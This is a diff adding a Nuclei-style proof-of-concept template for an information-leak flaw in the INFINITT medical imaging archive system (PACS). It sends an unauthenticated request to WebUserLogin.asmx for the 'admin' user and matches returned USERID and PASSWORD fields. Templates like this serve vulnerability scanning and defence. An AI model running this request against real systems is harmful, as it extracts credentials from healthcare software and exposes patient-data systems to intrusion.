@@ -1,0 +1,27 @@
+id: poc-yaml-infinitt-webuserlogin-asmx-info-leak
+info:
+  name: 英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "<USERID>.*?</USERID>"
+          - "<PASSWORD>.*?</PASSWORD>"
+      - type: word
+        words:
+          - "NewDataSet"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
